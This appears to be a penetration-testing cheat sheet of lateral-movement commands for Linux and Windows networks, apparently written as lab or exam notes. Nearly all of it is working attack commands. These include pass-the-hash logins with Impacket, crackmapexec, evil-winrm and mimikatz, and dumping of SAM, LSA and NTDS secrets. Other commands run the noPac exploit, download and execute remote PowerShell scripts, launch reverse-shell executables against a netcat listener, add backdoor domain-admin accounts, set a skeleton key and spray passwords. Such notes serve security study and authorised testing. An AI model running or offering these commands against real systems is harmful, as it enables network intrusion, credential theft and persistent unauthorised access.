# Remote Access & Lateral Movement

## Remote Access & Lateral Movement

### Linux OS

#### SSH

```bash
# Normal connection
ssh mara@192.168.0.191
# With Private Key
chmod 700 key.txt
ssh -i key.txt stinky@192.168.142.219

# If you have a shell issue at login
ssh -t  margo@192.168.103.110 /bin/sh

# XForward
ssh -X fox@$RHOST 
```

When you see the following error - Too many authentication failures in ssh,&#x20;

<figure><img src=".gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

Try the following tricks.&#x20;

```bash
# Clear Authentication caches 
ssh-add -D
# Then ssh 
ssh -i key.txt stinky@192.168.142.219 

# Or add the o option -o identitiesOnly=true 
ssh -i key.txt stinky@192.168.142.219 -o identitiesOnly=true
```



### Windows OS

#### pth-winexe

```bash
# SMB port 445 required
# @Kali 

pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.142.156 cmd.exe
```

#### Impacket: PsExe.py

```bash
# File and Printer sharing must be enabled;
# The ADMIN$ share should be available.
# A member of Administrators 

# @Kali 
psexec.py vault.offsec/anirudh:SecureHM@192.168.51.172
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c user@192.168.1.2 cmd.exe
```

#### Impacket:smbclient.py

```bash
# port 445
# @Kali 
smbclient.py THROWBACK.local/humphreyw:securitycenter@10.200.74.219
smbclient.py [domain]/[user]:[password/password hash]@[Target IP Address]
smbclient.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password

>Shares
>Use <Share name>
>cd <directory>
>mget
>mput 
etc.

```

#### Impacket:Scretsdump.py

```bash
# A member of Administrators 
# @Kali 
secretsdump.py -hashes LM:NTLM ./Administrator@TARGET

# A Domain User only required
# CVE-2021-42278 and CVE-2021-42287
# https://github.com/Ridter/noPac
python /opt/ad/noPac/noPac.py contoso.local/iptracej:'iptracej' -dc-ip 10.10.10.1 --impersonate Administrator -dump
```

#### Impacket: dcomexec.py

```bash
# tcp/135, tcp/445 and tcp/497561 
# @Kali 
dcomexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 "./Administrator"@192.168.204.183
```

#### Impacket: smbexec.py

```bash
# tcp/445
# @Kali
smbexec.py "./Administrator:pass123"@192.168.204.18
```

#### Impacket: wmiexec.py

```bash
# tcp/135 and tcp/445 and WMI tcp/50911 or like
# @Kali 
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 "./Administrator"@192.168.204.183
wmiexec.py xor.com/daisy@10.11.1.122 -hashes aad3b435b51404eeaad3b435b51404ee:f6084ca1a4905c45747d4bdcc1fcab84
```

#### Impacket: Atexec.py

```bash
# @Kali 
atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 "./Administrator"@192.168.204.183 "whoami"
atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b contoso.local/Administrator@10.10.10.1 "powershell -c iex(new-object net.webclient).downloadstring('http://10.10.10.100:8000/chimera.ps1')"

```

#### Microsoft: PsExect

```bash
# @Victim Windows 
# Escalate to SYSTEM privilege 
psexec.exe -accepteula \\TARGET cmd.exe 
C:\PrivEsc\PSExec64.exe -accepteula -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
.\PsExec64.exe -accepteula -i -s C:\PrivEsc\reverse.exe 
PsExec64.exe -i -accepteula -d -s C:\Users\alice\Desktop\reverse_3333.exe
```

#### Crackmapexec

```bash
# @Kali
crackmapexec smb 192.168.57.114 -u steph -p 'billabong' # check if you can connect via SMB 
# SMB
crackmapexec smb 192.168.57.114 -u steph -p 'billabong' -x whoami
crackmapexec smb -d . -u Administrator -H aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 -x "cmd /c whoami" 192.168.204.183
# Task Schedule Service
crackmapexec smb --exec-method atexec -d . -u Administrator -p 'pass123' -x "whoami" 192.168.204.183
crackmapexec smb --exec-method atexec -d . -u Administrator -H aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 -x "whoami" 192.168.204.183
# DCOM - 135,445, 49751 (DCOM) 
crackmapexec smb --exec-method mmcexec -d . -u Administrator -p 'pass123' -x "whoami" 192.168.204.183
crackmapexec smb --exec-method mmcexec -d . -u Administrator -H aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 -x "whoami" 192.168.204.183
# Winrm
crackmapexec winrm -d . -u Administrator -p 'pass123' -x "whoami" 192.168.204.183	
crackmapexec winrm -d . -u Administrator -H aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 -x "whoami" 192.168.204.183

# Post Exploitation
crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS' --lusers # Logged-in users
crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --sam # Dump local SAM hashes
crackmapexec smb 10.10.10.1 -u 'offsec' -p 'Password0-' --pass-pol # Check password policy

# Enumerations
crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --users # Enumerate users
crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --groups # Enumerate groups
crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --spider C\$ --pattern txt # Enumerate text files
crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --shares # Shares 
crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --sessions # Sessions
crackmapexec smb 192.168.1.0/24 -u "kavish" "Administrator" -p "Ignite@987" # Bruteforce users
crackmapexec smb 192.168.1.0/24 -u "Administrator" -p "password1" "password2" "Ignite@987" # Bruteforce passwords 

# Dump secrets 
# A member of Administrators 
crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --sam # Dump sam
crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --lsa # Dump lsa 
crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --ntds drsuapi # Dump NTDS (DRUSAPI)
crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --ntds vss # Dump NTDS (VSS)
```

#### Evil-WinRM

```bash
# WinRM service running and port 5985/5986 for HTTP(S) traffic 
# @Kali 
evil-winrm -i 192.168.174.165 -u enox -H 41BCD07B8CC9636826FE07FF9539CA57
evil-winrm -i 10.10.10.161 -u Administrator -p aad3b435b51404eeaad3b435b51404ee:32693b11e6a
a90eb43d32c72a07ceea6
evil-winrm -i 192.168.174.165 -u enox -p california
./evil-winrm.rb -i 10.10.10.161 -u svc-alfresco -p s3rvice

# Upload filess
PS>upload /path/to/local/file /path/to/remote/file 

# Load Powershell
# Store all powershell files under /tmp/powershell directory in Kali 
evil-winrm -i 192.168.1.105 -u administrator -p 'Ignite@987' -s /tmp/powershell
PS> menu
PS> Invoke-Mimikatz.ps1
PS> Invoke-Mimikatz 

# Invoke binary
PS>Invoke-Binary <binary.exe>
```

#### Mimikatz

```bash
#
# @Victim Windows 
./mimikatz64.exe
sekurlsa::pth /user:.\localadmin /ntlm:HASH /run:cmd.exe

sekurlsa::pth /user:Administrator$ /domain:contoso.local /ntlm:64f12cddaa88057e06a81b54e73b949b
dir \\TARGET\C$ 

# @Kali
crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -M mimikatz
crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -M mimikatz -o COMMAND='privilege::debug'
crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -M mimikatz -o COMMAND='sekurlsa::logonPasswords'
crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -M mimikatz -o COMMAND='misc::skeleton'
```

#### PowerShell Remoting

```bash
# WinRM service running and port 5985 for HTTP traffic 
# A member of Remote Management Users or Administrators
# @Victim Windows 

PS> $pass = ConvertTo-SecureString "Password1" -AsPlainText -Force
PS> $cred = New-Object System.Management.Automation.PSCredential("wgraff",$pass)
PS> Enter-PSSession -ComputerName MS03 -Credential $cred

Enter-PSSession -Computername TAGRET 
Invoke-Command -Computername TARGET -ScriptBlock {whoami /priv}
Invoke-Command -ComputerName TARGET -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
```

#### Remote Desktop

{% code overflow="wrap" %}
```bash
# RDP port is open and the user is a member of Remote Desktop Users
# @Kali
rdesktop -u ariah -p NowiseSloopTheory 192.168.224.99
xfreerdp /u:ariah /v:192.168.224.99 +clipboard
xfreerdp /u:admin /d:domain /pth:hash:hash /v:192.168.1.101
# @Victim Windows 

# Create another domain admin users and allows the users to do remote desktop
# Assumethat you are Administrator privileges
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
net user rdpuser Password@123 /add /domain
net localgroup "Remote Desktop Users" rdpuser /add
net localgroup "Administrators" rdpuser /add         # Local Admins 
net group "Domain Admins" rdpuser /add /domain       # Domain Admins

# Connect to the server
xfreerdp /u:rdpuser /p:Password@123 /v:10.129.197.120
```
{% endcode %}

#### WMI (Windows Management Instrumentation)

```bash
# tcp/135 
# Requires a member of Administrators
wmic /node:TARGET process call create "notepad.exe"

# @Victim Windows 
copy shell.exe \\TARGET\C$\windows\temp
wmic /node:TARGET process call create “c:\windows\temp\shell.exe”

# Add a user
wmic /node:192.168.1.2 /user:CORP\user /password:password  process call create "cmd.exe /c net user hacker P@ssw0rd /add"

```

#### Remote Service Creation

```bash
# Requires a member of Administrators

# @Victim Windows 
copy shell.exe \\TARGET\C$\windows\temp
sc \\TARGET create TestService binpath= "C:\windows\temp\shell.exe"
sc \\TARGET start TestService

# Kali
rlwrap nc -nlvp 1234
```

#### Password Spray

```bash
# PasswordSpray
# Kali 
crackmapexec smb 192.168.1.106 -u /root/Desktop/user.txt -p 'Password@1' --rid-brute

# @Victim Windows 
# You may have some error during the command execution
iex (new-Object Net.WebClient).DownloadString('http://10.10.10.100/post/DomainPasswordSpray.ps1')|Import-Module DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Spring2017
Invoke-DomainPasswordSpray -Password Password0-

https://github.com/dafthack/DomainPasswordSpray]

# WimRM login BruteForce 
iptracej@kali:/opt/bruteforce/winrm-brute$ bundle exec ./winrm-brute.rb -U users.txt -p '$fab@s3Rv1ce$1' 10.10.10.193
```

#### RDP Hijack

https://riccardoancarani.github.io/2019-10-04-lateral-movement-megaprimer/
